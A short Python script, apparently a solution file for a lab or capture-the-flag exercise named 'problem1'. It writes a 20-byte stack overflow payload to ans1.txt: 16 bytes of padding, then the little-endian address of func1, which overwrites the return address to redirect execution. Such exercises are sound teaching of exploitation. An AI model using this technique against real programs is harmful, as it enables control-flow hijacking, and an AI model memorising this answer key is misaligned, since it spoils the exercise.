#!/usr/bin/env python3
"""
Problem1 Payload Generator

Generate ans1.txt for stack overflow exploit in problem1.
Creates a 20-byte payload that overflows the buffer and redirects execution to func1.

Payload structure:
- 16 bytes of padding ('A')
- 4 bytes: address of func1 function (0x00401216, little-endian)
"""

from pathlib import Path

# 16 bytes padding + func1 address (0x00401216 in little-endian)
payload = b"A" * 16 + b"\x16\x12\x40\x00"

# Write to ans1.txt in parent directory
Path(__file__).resolve().parents[1].joinpath("ans1.txt").write_bytes(payload)

